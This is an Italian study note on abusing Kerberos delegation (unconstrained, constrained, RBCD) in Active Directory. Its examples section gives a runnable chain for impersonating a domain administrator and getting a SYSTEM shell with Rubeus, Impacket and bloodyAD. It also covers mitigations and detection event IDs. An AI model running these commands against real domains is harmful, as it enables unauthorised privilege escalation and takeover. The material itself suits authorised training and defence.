---
tipo: concetto
tag: [windows, active-directory]
fase: 3
fonti: 4
aggiornato: 2026-06-28
stato: maturo
aliases: ["Delegation Kerberos (Unconstrained, Constrained, RBCD)"]
---

# Delegation Kerberos (Unconstrained, Constrained, RBCD)

> **Nota etica**: tecniche da usare solo in lab autorizzati (TryHackMe, HTB, GOAD) o engagement con permesso scritto.

## In breve
La **delegation** Kerberos serve a un servizio per **agire per conto di un utente** verso un altro servizio (es. un web server che accede a un DB come l'utente loggato). È una funzione legittima e necessaria, ma le sue tre forme — **Unconstrained**, **Constrained** e **Resource-Based Constrained Delegation (RBCD)** — sono altrettanti vettori di escalation in [[Active Directory]]. Il filo comune è l'abuso delle estensioni **S4U2self** e **S4U2proxy** di [[Kerberos]] per **forgiare ticket di servizio come un utente arbitrario, incluso un Domain Admin**. La RBCD in particolare è oggi la primitiva preferita perché spesso ottenibile con soli diritti di **scrittura su un attributo** di un computer.

## Come funziona
Tutto ruota attorno al **TGT** e alle estensioni **S4U** (Service-for-User):

- **Unconstrained Delegation**: il flag `TRUSTED_FOR_DELEGATION` su un account (computer o servizio). Quando un utente si autentica via Kerberos a quel servizio, **invia una copia del proprio TGT** dentro il ticket di servizio. Il servizio lo **memorizza in cache**. Se comprometto quel server, estraggo i TGT di **chiunque vi si sia autenticato** — inclusi, se coercio un DC, il TGT del **DC$** (→ [[DCSync]]). Si combina con [[PrinterBug e Coercizione]].
- **Constrained Delegation**: attributo `msDS-AllowedToDelegateTo` su un account = lista di SPN verso cui può delegare. Usa **S4U2self** (l'account chiede a sé stesso un ticket *forwardable* per un utente arbitrario) + **S4U2proxy** (usa quel ticket per ottenere un ticket di servizio verso l'SPN target). Con `protocol transition` posso impersonare **qualsiasi utente** verso i servizi in lista — e l'SPN si può cambiare (es. da `cifs` a `host`/`ldap`) perché il KDC non vincola la *classe* del servizio sullo stesso host.
- **RBCD**: il controllo è **rovesciato**. Sul **computer di destinazione** l'attributo `msDS-AllowedToActOnBehalfOfOtherIdentity` elenca **chi può delegare verso di esso**. Se ho **GenericWrite / WriteProperty** su un computer (trovabile con [[BloodHound]]), ci scrivo l'SID di un account che controllo (anche uno appena creato), poi uso S4U2self+S4U2proxy per ottenere un ticket come **Administrator** verso quel computer.

```
RBCD: WriteProperty su SRV01$  -->  set msDS-AllowedToActOnBehalfOfOtherIdentity = FAKECOMP$
   FAKECOMP$ --S4U2self--> ticket forwardable "administrator"
            --S4U2proxy--> ST cifs/SRV01  -->  PsExec come SYSTEM
```

## Esempi
**Trovare** account/computer delegabili ([[BloodHound]], [[bloodyAD]]):
```bash
# bloodyAD: chi ha unconstrained / constrained
bloodyAD --host 10.10.10.1 -d dominio.local -u user -p pass get search \
  --filter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' --attr sAMAccountName
```
**Unconstrained** — cattura TGT con [[Mimikatz]]/Rubeus + coercizione:
```
Rubeus.exe monitor /interval:5 /nowrap     # in ascolto sui TGT in arrivo
# poi forzo il DC: PrinterBug/PetitPotam -> arriva il TGT di DC$
Rubeus.exe ptt /ticket:<base64-TGT-DC$>
```
**Constrained** (con protocol transition), via Rubeus:
```
Rubeus.exe s4u /user:websvc$ /rc4:<hash> /impersonateuser:administrator \
  /msdsspn:cifs/srv01.dominio.local /ptt
```
**RBCD** — catena completa da Linux con [[Impacket]] e [[bloodyAD]]:
```bash
# 1) creo un computer fittizio (se MachineAccountQuota > 0)
impacket-addcomputer dominio.local/user:'Password!' -computer-name 'FAKE$' \
  -computer-pass 'FakePass123' -dc-ip 10.10.10.1

# 2) scrivo la delega sul computer bersaglio (ho GenericWrite su SRV01$)
bloodyAD --host 10.10.10.1 -d dominio.local -u user -p pass \
  add rbcd SRV01$ FAKE$
# (alternativa: impacket-rbcd -delegate-from 'FAKE$' -delegate-to 'SRV01$' -action write ...)

# 3) S4U2self + S4U2proxy: ticket come administrator verso SRV01
impacket-getST -spn cifs/srv01.dominio.local -impersonate administrator \
  -dc-ip 10.10.10.1 'dominio.local/FAKE$:FakePass123'

# 4) uso il ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass dominio.local/administrator@srv01.dominio.local
```
Registrazione di un SPN quando serve (`addspn.py` di dirkjanm) o gestione attributi via `bloodyAD set object`.

## Mitigazione e difesa
- **Eliminare la Unconstrained Delegation** ovunque possibile; gli account sensibili devono avere **"Account is sensitive and cannot be delegated"** (`NOT_DELEGATED`) o appartenere a **Protected Users**.
- **MachineAccountQuota = 0**: toglie all'attaccante la possibilità di creare il computer fittizio per RBCD.
- **Audit delle ACL sui computer**: nessun utente normale deve avere GenericWrite/WriteProperty su oggetti computer (chiude RBCD).
- Monitorare modifiche a `msDS-AllowedToActOnBehalfOfOtherIdentity` e `msDS-AllowedToDelegateTo` (Event **5136**).
- Mettere i DC e gli account Tier 0 fuori dalla portata della delega; bloccare la **coercizione** (vedi [[PrinterBug e Coercizione]]).

## Lab
- [[TryHackMe]] — *Persisting AD* / room sulla delegation.
- [[HackTheBox]] — box con RBCD/constrained (es. **Intelligence**, **Multimaster**).
- **GOAD - Game of Active Directory**: scenari di unconstrained, constrained e RBCD inclusi.

## Domande
1. **Perché la Unconstrained Delegation è così pericolosa?** Perché il server **memorizza i TGT** di chi si autentica: compromesso il server e coercito un DC, ottieni il TGT del DC$.
2. **Cosa fa S4U2self e cosa S4U2proxy?** S4U2self ottiene un ticket forwardable **per conto di** un utente arbitrario verso sé stessi; S4U2proxy lo riusa per ottenere un ST verso il **servizio target**.
3. **Perché la RBCD basta uno WriteProperty?** Perché il controllo sta sull'oggetto **bersaglio**: scrivendo `msDS-AllowedToActOnBehalfOfOtherIdentity` autorizzo un account che controllo a delegare verso quel computer.
4. **Posso cambiare l'SPN nel constrained delegation?** Sì: il KDC non vincola la *service class*, quindi da `cifs/host` posso ottenere `host/`, `ldap/` ecc. sullo stesso host.
5. **Quale impostazione protegge un Domain Admin dalla delega?** Il flag **"sensitive and cannot be delegated"** o l'appartenenza a **Protected Users**.

## Approfondimento livello esperto
**RBCD chain con coercizione**: variante senza credenziali iniziali utili — relay NTLM (vedi [[NTLM Relay]]) di un computer coercito (PetitPotam/PrinterBug) verso **LDAP** per scrivere `msDS-AllowedToActOnBehalfOfOtherIdentity` su sé stesso, poi S4U → SYSTEM locale. È la chain *coercion → LDAP relay → RBCD → S4U*. La stessa coercizione alimenta anche **ESC8** (vedi [[ADCS e Template Vulnerabili (ESC1-ESC8)]]): coercion è la primitiva condivisa.

**S4U bronze/silver interplay**: con l'hash del computer si possono forgiare ST arbitrari (Silver Ticket), ma S4U2proxy è "pulito" perché passa dal KDC e produce un PAC valido.

**Detection (Event ID)**:
- **4768** (TGT) e **4769** (TGS) — un'esplosione di 4769 per servizi diversi a nome dello stesso utente subito dopo un 4768 = pattern S4U; cercare ticket con `Transited Services` popolato.
- **4624 / 4648** con account computer che agisce per un utente privilegiato.
- **5136** su `msDS-AllowedToActOnBehalfOfOtherIdentity` / `msDS-AllowedToDelegateTo` / `userAccountControl` (flag delegation).
- **4741** (computer account creato) → possibile preludio RBCD.

**ATT&CK**: T1558 (Steal or Forge Kerberos Tickets), T1134 (Access Token Manipulation); la persistenza via cert correlata è **T1649**.

## Collegamenti
- [[Kerberos]] — S4U2self / S4U2proxy / TGT sono il cuore di tutto
- [[Active Directory]] — attributi UAC e delegation
- [[Kerberoasting]] — spesso fornisce l'hash del servizio delegabile
- [[PrinterBug e Coercizione]] · [[NTLM Relay]] — innesco di unconstrained e RBCD-relay
- [[DCSync]] — esito finale (TGT del DC$ → dump dominio)
- [[BloodHound]] — edge `AllowedToDelegate` / `AllowedToAct`
- [[Impacket]] · [[bloodyAD]] · [[Mimikatz]]
- [[ADCS e Template Vulnerabili (ESC1-ESC8)]] · [[Shadow Credentials]] · [[Trust di Dominio e Foresta]]

## Fonti
- harmj0y — *S4U2Pwnage* / Kerberos delegation: https://blog.harmj0y.net/activedirectory/s4u2pwnage/
- The Hacker Recipes — Kerberos Delegations: https://www.thehacker.recipes/ad/movement/kerberos/delegations
- dirkjanm — *Wagging the Dog* (RBCD): https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
- HackTricks — Constrained / Unconstrained / RBCD: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
